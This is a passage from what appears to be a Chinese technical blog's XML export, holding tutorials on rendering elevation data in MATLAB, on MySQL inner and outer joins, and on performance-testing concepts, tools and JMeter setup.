<td style="text-align: center;"> 内存</td>
<td> 16G*2, 3600MHz</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td style="text-align: center;"> 磁盘</td>
<td> 256G，SSD</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td style="text-align: center;"> 显卡</td>
<td> RTX4060Ti</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5</td>
<td style="text-align: center;">MATLAB</td>
<td>2023b</td>
</tr>
<tr class="even">
<td style="text-align: center;">6</td>
<td style="text-align: center;"> 高程数据文件</td>
<td> GMTED2010.TIFF，包含全球陆地的高程数据</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="实现过程">3. 实现过程</h1>
<ol type="1">
<li><p>通过 <code>readgeoraster</code> 函数读取 tiff 文件，获取 DEM 数据大小。</p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">clc;clear;</span><br><span class="line">file = <span class="string">'GMTED2010.tif'</span>;</span><br><span class="line">[dem_data, ~] = readgeoraster(file);</span><br><span class="line">[row,col, ~] = <span class="built_in">size</span>(dem_data);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>（可选）设置缩放倍数。</p>
<blockquote>
<p>由于计算机内存受限，以原始 DEM 数据进行渲染 3D 效果时，会导致内存不够。</p>
</blockquote>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">% 设置缩放倍数</span></span><br><span class="line"><span class="comment">% 10代表从dem_data数据中每隔10个点取一次</span></span><br><span class="line">multiple = <span class="number">10</span>;</span><br><span class="line"><span class="comment">% 缩放后的XY坐标向量（经度轴和纬度轴）</span></span><br><span class="line">small_col = col / multiple;</span><br><span class="line">small_row = row / multiple;</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>初始化 Z 轴向量（高程轴）。</p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">% 方法一</span></span><br><span class="line">alt = int16(<span class="built_in">zeros</span>(small_row, small_col));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ri = <span class="number">1</span>: small_row</span><br><span class="line">    <span class="keyword">for</span> ci= <span class="number">1</span>: small_col</span><br><span class="line">        alt(ri, ci) = dem_data((ri<span class="number">-1</span>)*multiple + <span class="number">1</span>, (ci<span class="number">-1</span>)*multiple + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">disp</span>(<span class="string">"total data: "</span> + small_row*small_col + <span class="string">", copied: "</span> + ri*ci);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 方法二</span></span><br><span class="line">alt = dem_data(<span class="number">1</span>:multiple:<span class="keyword">end</span>, <span class="number">1</span>:multiple:<span class="keyword">end</span>);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>（可选）清除无用的变量，腾出内存空间。</p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">clear dem_data;</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>对横坐标 longitude 和纵坐标 latitude 生成二维网格矩阵，矩阵大小为
<code>small_row × small_col</code>，与 alt 变量维度保持一致。</p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">[longitude, latitude] = <span class="built_in">meshgrid</span>(<span class="number">1</span>:small_col, <span class="number">1</span>:small_row);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 默认是double类型，转换成int16，减少内存占用</span></span><br><span class="line">longitude = int16(longitude);</span><br><span class="line">latitude = int16(latitude);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>使用 <code>mesh</code> 函数渲染 3D 曲面图形。</p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">% 将alt矩阵进行左右翻转</span></span><br><span class="line">alt = <span class="built_in">fliplr</span>(alt);</span><br><span class="line">mesh(longitude, latitude, alt);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>为图形加上三轴标签。</p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">xlabel(<span class="string">"longitude"</span>);</span><br><span class="line">ylabel(<span class="string">"latitude"</span>);</span><br><span class="line">zlabel(<span class="string">"alt"</span>);</span><br><span class="line"><span class="built_in">hold</span> on;</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<h1 id="渲染效果">4. 渲染效果</h1>
<figure>
<img src="/p/5deb4750/高程数据3D渲染图.jpg" alt="高程数据3D渲染图">
<figcaption aria-hidden="true">高程数据 3D 渲染图</figcaption>
</figure>
<h1 id="完整代码">5. 完整代码</h1>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">clc;clear;</span><br><span class="line">file = <span class="string">'GMTED2010.tif'</span>;</span><br><span class="line">[dem_data, ~] = readgeoraster(file);</span><br><span class="line">[row,col, ~] = <span class="built_in">size</span>(dem_data);</span><br><span class="line"></span><br><span class="line">multiple = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">small_col = col / multiple;</span><br><span class="line">small_row = row / multiple;</span><br><span class="line"></span><br><span class="line"><span class="comment">% alt = int16(zeros(small_row, small_col));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%for ri = 1: small_row</span></span><br><span class="line"><span class="comment">%    for ci= 1: small_col</span></span><br><span class="line"><span class="comment">%        alt(ri, ci) = dem_data((ri-1)*multiple + 1, (ci-1)*multiple + 1);</span></span><br><span class="line"><span class="comment">%    end</span></span><br><span class="line"><span class="comment">%    disp("total data: " + small_row*small_col + ", copied: " + ri*ci);</span></span><br><span class="line"><span class="comment">%end</span></span><br><span class="line"></span><br><span class="line">alt = dem_data(<span class="number">1</span>:multiple:<span class="keyword">end</span>, <span class="number">1</span>:multiple:<span class="keyword">end</span>);</span><br><span class="line"></span><br><span class="line">clear dem_data;</span><br><span class="line">[longitude, latitude] = <span class="built_in">meshgrid</span>(<span class="number">1</span>:small_col, <span class="number">1</span>:small_row);</span><br><span class="line"></span><br><span class="line">longitude = int16(longitude);</span><br><span class="line">latitude = int16(latitude);</span><br><span class="line">alt = <span class="built_in">fliplr</span>(alt);</span><br><span class="line">mesh(longitude, latitude, alt);</span><br><span class="line">xlabel(<span class="string">"longitude"</span>);</span><br><span class="line">ylabel(<span class="string">"latitude"</span>);</span><br><span class="line">zlabel(<span class="string">"alt"</span>);</span><br><span class="line"><span class="built_in">hold</span> on;</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>MATLAB</category>
      </categories>
      <tags>
        <tag>MATLAB</tag>
        <tag>meshgrid</tag>
        <tag>DEM</tag>
      </tags>
  </entry>
  <entry>
    <title>【MySQL】动画演示 MySQL 内外连接的效果</title>
    <url>/p/627ef87e.html</url>
    <content><![CDATA[<h1 id="mysql内外连接">1. MySQL 内外连接</h1>
<p>  在 MySQL/Oracle 数据库中，经常会对两张或两张以上的表进行联合查询，联合查询的方式有多种，例如通过 <code>where</code> 关键字编写子查询语句、以及今天要阐述的内外连接查询。接下来，将通过实际查询数据库表的方式，简单展示下内外连接的查询效果。</p>
<span id="more"></span>
<hr>
<h1 id="表数据准备">2. 表数据准备</h1>
<h2 id="创建数据库">2.1. 创建数据库</h2>
<ol type="1">
<li>执行如下 SQL 命令，创建一个 <code>demo</code> 数据库。
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database `demo` <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="string">'utf8'</span> <span class="keyword">COLLATE</span> <span class="string">'utf8_general_ci'</span>;</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="创建表">2.2. 创建表</h2>
<ol type="1">
<li>执行如下 SQL 命令，创建两张表。 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">-- Table structure for course</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `course`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `course` (</span><br><span class="line">  `course_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `course_name` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `course_teacher` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`course_id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Table structure for grade</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `grade`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `grade` (</span><br><span class="line">  `grade_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `sutdent_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `student_name` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `course_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `score` <span class="type">int</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`grade_id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br></pre></td></tr></tbody></table></figure></li>
<li>两张表的结构如下图所示。 <img src="/p/627ef87e/course表结构.webp" alt="course表结构"> <img src="/p/627ef87e/grade表结构.webp" alt="grade表结构"></li>
</ol>
<h2 id="插入数据">2.3. 插入数据</h2>
<ol type="1">
<li>执行如下 SQL 命令，对上述几张表插入几条数据。 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">-- Records of course</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `course` <span class="keyword">VALUES</span> (<span class="number">21001</span>, <span class="string">'C语言程序设计'</span>, <span class="string">'李老师'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `course` <span class="keyword">VALUES</span> (<span class="number">21002</span>, <span class="string">'高等数学'</span>, <span class="string">'刘老师'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `course` <span class="keyword">VALUES</span> (<span class="number">21003</span>, <span class="string">'线性代数'</span>, <span class="string">'陈老师'</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Records of grade</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `grade` <span class="keyword">VALUES</span> (<span class="number">992101001</span>, <span class="number">21147001</span>, <span class="string">'唐僧'</span>, <span class="number">21001</span>, <span class="number">89</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `grade` <span class="keyword">VALUES</span> (<span class="number">992101002</span>, <span class="number">21147001</span>, <span class="string">'唐僧'</span>, <span class="number">21002</span>, <span class="number">81</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `grade` <span class="keyword">VALUES</span> (<span class="number">992101003</span>, <span class="number">21147002</span>, <span class="string">'孙悟空'</span>, <span class="number">21001</span>, <span class="number">78</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `grade` <span class="keyword">VALUES</span> (<span class="number">992101004</span>, <span class="number">21147002</span>, <span class="string">'孙悟空'</span>, <span class="number">21002</span>, <span class="number">91</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `grade` <span class="keyword">VALUES</span> (<span class="number">992101005</span>, <span class="number">21147003</span>, <span class="string">'李四'</span>, <span class="number">21002</span>, <span class="number">73</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `grade` <span class="keyword">VALUES</span> (<span class="number">992101006</span>, <span class="number">21147003</span>, <span class="string">'李四'</span>, <span class="number">21004</span>, <span class="number">85</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></tbody></table></figure></li>
<li>两张表的数据如下所示。 <img src="/p/627ef87e/course表数据.webp" alt="course表数据"> <img src="/p/627ef87e/grade表数据.webp" alt="grade表数据"></li>
</ol>
<hr>
<h1 id="内连接">3. 内连接</h1>
<ol type="1">
<li>内连接，即选取两张表内指定字段是相同的数据（取交集），然后将数据进行拼接。SQL 语句模板如下，其中 where 子句可选。
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> </span><br><span class="line">  <span class="keyword">from</span> table_1 a <span class="keyword">inner</span> <span class="keyword">join</span> table_2 b</span><br><span class="line">  <span class="keyword">on</span> a.field <span class="operator">=</span> b.field</span><br><span class="line">  [<span class="keyword">where</span> 子句];</span><br></pre></td></tr></tbody></table></figure></li>
<li>以上述两张表为例，获取每个学生对应课程的成绩，如果是以 course_id 字段做内连接查询的话，应该取两张表均存在的 course_id 对应的数据。SQL 语句及动画效果如下。
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">  <span class="keyword">FROM</span> demo.grade a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> demo.course b </span><br><span class="line">  <span class="keyword">ON</span> a.course_id <span class="operator">=</span> b.course_id;</span><br></pre></td></tr></tbody></table></figure> <img src="/p/627ef87e/内连接查询结果.webp" alt="内连接查询结果"> <img src="/p/627ef87e/内连接动画效果.gif" alt="内连接动画效果"></li>
</ol>
<h1 id="外连接">4. 外连接</h1>
<h2 id="左外连接">4.1. 左外连接</h2>
<p>左外连接查询，即查询出左表所有数据，根据 course_id 字段，从右表找出相同的那条数据进行拼接，如果在右表中没有找到，则以 <code>NULL</code> 值填充。SQL 语句查询结果及动画效果如下所示。
</p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">  <span class="keyword">FROM</span> demo.grade a <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> demo.course b </span><br><span class="line">  <span class="keyword">ON</span> a.course_id <span class="operator">=</span> b.course_id;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/p/627ef87e/左连接查询结果.webp" alt="左外连接查询结果"> <img src="/p/627ef87e/左外连接动画效果.gif" alt="左外连接动画效果"></p>
<h2 id="右外连接">4.2. 右外连接</h2>
<p>右外连接则与左外连接相反，先查询出右表所有数据，然后同样根据 course_id 字段，在左表中找出与之对应的数据进行拼接，没有找到的数据，以 <code>NULL</code> 值替代。SQL 语句查询结果与动画效果如下所示。
</p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">  <span class="keyword">FROM</span> demo.grade a <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> demo.course b </span><br><span class="line">  <span class="keyword">ON</span> a.course_id <span class="operator">=</span> b.course_id;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/p/627ef87e/右连接查询结果.webp" alt="右外连接查询结果"> <img src="/p/627ef87e/右外连接动画效果.gif" alt="右外连接动画效果"></p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>内连接</tag>
        <tag>外连接</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】01. 性能测试技术初探篇之性能测试介绍</title>
    <url>/p/8a2bea76.html</url>
    <content><![CDATA[<h1 id="引子">1. 引子</h1>
<p>  性能测试在软件的质量保证中起着重要的作用。性能测试从软件系统的响应速度、效率、资源使用等方面对软件系统的质量进行度量。随着社会对互联网应用系统的不断深入，对性能测试的需求也越来越迫切。作为软件测试工程师，掌握必要的性能测试基础知识和测试工具的使用，不仅能够提升自我技术能力的竞争力，也能够在日常工作中，灵活运用各种工具来提升工作效率。</p>
<hr>
<h1 id="常见的性能瓶颈">2. 常见的性能瓶颈</h1>
<p>  常见的性能瓶颈，可以分别从硬件、软件上进行划分。硬件上的性能瓶颈包括：CPU、内存、磁盘 I/O、网络等；软件上的性能瓶颈则包括：支持软件如中间件配置、容器配置、数据库 I/O 等，项目软件如响应时间、吞吐量、异常处理等。</p>
<h2 id="cpu">2.1. CPU</h2>
<p>  程序的运行离不开 CPU 的计算和指令，它们会长时间、不间断地占用 CPU 资源，当所运行的计算数量超过了 CPU 的容量时，就会导致性能问题。一般地，如果在程序运行时，CPU 利用率持续并达到了 90% 及以上，那么就可以认为，CPU 出现了性能瓶颈。</p>
<h2 id="内存">2.2. 内存</h2>
<p>  Java 程序一般通过 JVM 对内存进行分配管理，但可能由于系统设计或功能实现上的缺陷，导致程序占用内存资源一直居高不下，甚至出现内存溢出 / 内存泄露等问题，从而出现性能瓶颈。</p>
<h2 id="磁盘">2.3. 磁盘</h2>
<p>  磁盘的空间一般比内存要大很多，但相应地，其 I/O 读写能力却比内存慢。因此，在程序对磁盘内的文件（特别是大型文件）进行读取或者写入的时候，就可能会引发磁盘 IO 读写性能瓶颈。</p>
<h2 id="网络">2.4. 网络</h2>
<p>  网络对于系统的性能来说，也是至关重要的一环。重要的一个指标就是网络带宽，它由网卡性能、网卡接口、网线类型等因素所影响。对于数据传输比较大、并发量比较大的系统，就比较容易出现网络上的性能瓶颈。</p>
<h2 id="中间件">2.5. 中间件</h2>
<p>  例如中间件的超时设置、线程池设置、缓存策略、最大连接数、负载均衡策略等。</p>
<h2 id="数据库io">2.6. 数据库 IO</h2>
<p>  系统软件的运行离不开数据库，而数据库的操作一般都是涉及到磁盘 I/O 读写，大量的读写操作，可能会导致磁盘 I/O 的性能瓶颈，进而产生数据读写延迟等问题。除此之外，还有数据库连接池配置等因素，也可能引发性能瓶颈问题。</p>
<hr>
<h1 id="名词解释">3. 名词解释</h1>
<table>
<colgroup>
<col style="width: 3%">
<col style="width: 11%">
<col style="width: 26%">
<col style="width: 58%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th>名词</th>
<th>英文名称</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td> 响应时间</td>
<td> Response Time</td>
<td> 响应时间是指系统对请求作出响应所需要的时间。典型的响应时间是指从客户端发出请求数据包到服务器处理，并接收到返回数据包所经过的时间，中间可能包含各种中间组件的处理时间，例如网络、服务器、数据库等。</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td> 事务响应时间</td>
<td> Transaction Response Time</td>
<td> 事务是指一组 == 密切相关的操作 == 的组合，例如一个登录的过程，可能包含 N 次 http 请求和响应，那么就可以将这些请求封装在一个事务中，以此来分析登录的性能瓶颈。而事务响应时间，就是服务器针对这一个事务进行处理并完全返回数据包后所经过的时间。<br>（有业界默认的 2-5-8 原则）。</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td> 并发用户</td>
<td> Concurrent Users</td>
<td> 是指 == 同一时间 == 内使用 == 相同资源 == 的人或组件。资源可以是计算机系统资源、文件、数据库等。</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td> 吞吐量</td>
<td> Throughput</td>
<td> 是指单位时间内系统处理的客户请求的数量，度量单位可以是：字节 / 天、请求数 / 秒、访问量 / 天、处理业务数 / 小时等。</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5</td>
<td> 每秒事务量</td>
<td> Transaction Per Second(TPS)</td>
<td>TPS 是指每秒钟系统能够处理的交易或事务的数量，是衡量系统处理能力的重要指标。</td>
</tr>
<tr class="even">
<td style="text-align: center;">6</td>
<td> 点击率</td>
<td> Hit Per Second（HPS）</td>
<td>也称命中率，是指每秒钟用户向服务器提交的 HTTP 请求数。用户每点击一次，服务器就要处理一次，不难看出，点击率越大，对服务器的压力也越大。点击率只是一个性能参考指标，重要的是分析点击时产生的影响。</td>
</tr>
<tr class="odd">
<td style="text-align: center;">7</td>
<td> 资源利用率</td>
<td> Resource Utilization</td>
<td> 资源利用率指的是对不同系统资源的使用程度，如服务器的 CPU 占用率、磁盘利用率、内存占用率等，是性能指标分析和改善的重要依据。</td>
</tr>
</tbody>
</table>
<hr>
<blockquote>
<p>性能测试工具 JMeter 合集
<a class="article-sort-item-img" href="/p/8a2bea76.html" target="_blank">【Performance】01.
性能测试技术初探篇之性能测试介绍</a>
<a class="article-sort-item-img" href="/p/616bf269.html" target="_blank">【Performance】02.
性能测试技术初探篇之常用性能测试工具</a>
<a class="article-sort-item-img" href="/p/22fcd8bb.html" target="_blank">【Performance】03.
性能测试技术初探篇之 JMeter 工具使用</a>
<a class="article-sort-item-img" href="/p/3177ee85.html" target="_blank">【Performance】04.
性能测试技术磨合篇之性能测试场景设计</a>
<a class="article-sort-item-img" href="/p/5914cf6e.html" target="_blank">【Performance】05.
性能测试技术磨合篇之脚本录制和调试</a>
<a class="article-sort-item-img" href="/p/7bc6027.html" target="_blank">【Performance】06.
性能测试技术磨合篇之脚本执行和结果分析</a>
<a class="article-sort-item-img" href="/p/f25d7b6e.html" target="_blank">【Performance】07.
性能测试技术历练篇之性能监控工具</a>
<a class="article-sort-item-img" href="/p/683c1dd9.html" target="_blank">【Performance】08.
性能测试技术历练篇之性能分析神器 JProfile</a>
<a class="article-sort-item-img" href="/p/bf4fa918.html" target="_blank">【Performance】09.
性能测试技术历练篇之 Java 诊断工具 Arthas</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>性能瓶颈</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】02. 性能测试技术初探篇之常用性能测试工具</title>
    <url>/p/616bf269.html</url>
    <content><![CDATA[<h1 id="常用的性能测试工具">1. 常用的性能测试工具</h1>
<table>
<colgroup>
<col style="width: 20%">
<col style="width: 33%">
<col style="width: 33%">
<col style="width: 13%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th style="text-align: center;">工具名称</th>
<th style="text-align: center;">下载地址</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td style="text-align: center;">LoadRunner</td>
<td style="text-align: center;"><a href="https://www.microfocus.com/zh-cn/products/loadrunner-professional/overview">LR 官网</a></td>
<td> LoadRunner 是业界公认的权威性能测试工具，支持广泛的协议，能够模拟百万级的并发用户，是进行性能测试的最强有力的 “帮手”。</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td style="text-align: center;">JMeter</td>
<td style="text-align: center;"><a href="https://jmeter.apache.org/download_jmeter.cgi">Jmeter 官网</a></td>
<td>开源的负载测试工具，在互联网公司中十分流行，由 Java 语言编写。可用于接口、文件传输、数据库连接查询、ftp 服务操作等资源的性能测试，通过模拟繁重的负载来测试它们的强度或分析不同压力类型下的整体性能。</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td style="text-align: center;">Postman</td>
<td style="text-align: center;"><a href="https://www.postman.com/">Postman 官网</a></td>
<td> Postman 除了常用的接口测试之外，也可以用于性能测试。在配置 <code>Run collections</code> 时，
通过设置接口的迭代次数，测试数据文件等信息，运行后即可查看运行报告和运行结果。</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td style="text-align: center;">iPerf</td>
<td style="text-align: center;"><a href="https://iperf.fr/iperf-download.php">iPerf 官网</a></td>
<td>一般用于测试网络性能，如 TCP/UDP 带宽质量、网络延迟、数据包丢失等。</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="优缺点比较">2. 优缺点比较</h1>
<table>
<colgroup>
<col style="width: 45%">
<col style="width: 36%">
<col style="width: 18%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">工具名称</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> LoadRunner</td>
<td>1. 支持上万级别的多用户并发能力<br>2. 测试结果分析报表详细<br>3. 针对具有 IP 访问限制的系统软件，提供 IP 欺骗功能</td>
<td> 1. 体积庞大，相较于 JMeter 而言，需要安装且购买注册<br>2. 无法定制功能</td>
</tr>
<tr class="even">
<td style="text-align: center;"> JMeter</td>
<td>1. 开源许可，并提供源码以及自定义开发<br>2. 支持基于 Java 开发，支持多平台运行<br>3. 小巧便携，无需安装即可运行<br>4. 可添加第三方插件或自开发插件，实现更多的功能</td>
<td> 1. 不支持 IP 欺骗功能<br>2. 分析报表能力相较于 LR 欠缺</td>
</tr>
</tbody>
</table>
<hr>
<blockquote>
<p>性能测试工具 JMeter 合集
<a class="article-sort-item-img" href="/p/8a2bea76.html" target="_blank">【Performance】01.
性能测试技术初探篇之性能测试介绍</a>
<a class="article-sort-item-img" href="/p/616bf269.html" target="_blank">【Performance】02.
性能测试技术初探篇之常用性能测试工具</a>
<a class="article-sort-item-img" href="/p/22fcd8bb.html" target="_blank">【Performance】03.
性能测试技术初探篇之 JMeter 工具使用</a>
<a class="article-sort-item-img" href="/p/3177ee85.html" target="_blank">【Performance】04.
性能测试技术磨合篇之性能测试场景设计</a>
<a class="article-sort-item-img" href="/p/5914cf6e.html" target="_blank">【Performance】05.
性能测试技术磨合篇之脚本录制和调试</a>
<a class="article-sort-item-img" href="/p/7bc6027.html" target="_blank">【Performance】06.
性能测试技术磨合篇之脚本执行和结果分析</a>
<a class="article-sort-item-img" href="/p/f25d7b6e.html" target="_blank">【Performance】07.
性能测试技术历练篇之性能监控工具</a>
<a class="article-sort-item-img" href="/p/683c1dd9.html" target="_blank">【Performance】08.
性能测试技术历练篇之性能分析神器 JProfile</a>
<a class="article-sort-item-img" href="/p/bf4fa918.html" target="_blank">【Performance】09.
性能测试技术历练篇之 Java 诊断工具 Arthas</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>性能测试工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】03. 性能测试技术初探篇之 JMeter 工具使用</title>
    <url>/p/22fcd8bb.html</url>
    <content><![CDATA[<h1 id="安装配置及启动">1. 安装配置及启动</h1>
<ol type="1">
<li><p>jmeter 软件包可在 Apache 官网进行下载，官网地址如下，选择二进制文件（Binaries）进行下载后解压即可，无需安装步骤。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">https://jmeter.apache.org/download_jmeter.cgi</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>在启动 jmeter 之前，需要确保电脑已正确安装并配置 Java 环境（建议 Java8+），否则将无法启动。</p></li>
<li><p>jmeter 执行程序在解压路径内的 bin 目录下，windows 与 Linux/macOS 环境的启动方式有所不同，如下说明。</p>
<blockquote>
<p>Windows：
通过文件管理器进入 apache-jmeter-5.4.3，双击 <code>jmeter.bat</code> 即可（具体路径自行替换）。
linux/macOS：通过终端，执行命令 <code>cd apache-jmeter-5.4.3\bin &amp;&amp; ./jmeter.sh</code> 即可（具体路径自行替换）。</p>
</blockquote></li>
<li><p>如上所说，无论是 windows 还是 Linux/macOS，想要运行 jmeter，就必须进入 jmeter 执行程序所在目录下，否则终端将会 “无法找到此命令” 等提示信息。因此，若要在终端内的任何路径下都能通过一条命令直接启动 jmeter，可通过配置环境变量的方式，来实现该效果。</p>
<ul>
<li><p>Windows 配置环境变量 <img src="/p/22fcd8bb/Windows配置环境变量.webp" alt="Windows配置环境变量"></p></li>
<li><p>MacOS 配置环境变量 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 编辑bash_profile文件</span></span><br><span class="line">vi <span class="variable">$HOME</span>/.bash_profile</span><br><span class="line"><span class="comment"># 2. 按i键进入编辑模式，在文件最后添加如下两行内容</span></span><br><span class="line"><span class="built_in">export</span> JMETER_HOME=/Users/hyggeoha/Applications//apache-jmeter-5.4.3 <span class="comment"># 根据个人实际情况修改</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$JMETER_HOME</span>/bin</span><br><span class="line"><span class="comment"># 3. 按esc键退出编辑模式后，输入:wq命令以保存并退出。</span></span><br><span class="line"><span class="comment"># 4. 输入如下命令使之生效</span></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$HOME</span>/.bash_profile</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ul></li>
<li><p>以 MacOS 为例，在任意路径打开终端，输入 <code>jmeter</code> 后回车，jmeter 程序即可启动。
&gt; 注意：启动后，终端窗口不可关闭，否则 jmeter 程序也会随之而退出。</p>
<figure>
<img src="/p/22fcd8bb/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%90%AF%E5%8A%A8jmeter.webp" alt="MacOS下命令行启动jmeter">
<figcaption aria-hidden="true">MacOS 下命令行启动 jmeter</figcaption>
</figure></li>
</ol>
<hr>
<h1 id="界面介绍">2. 界面介绍</h1>
<p>  JMeter 主页面如下图所示，分为标题栏、菜单栏、工具栏、组件树页面、内容页面。
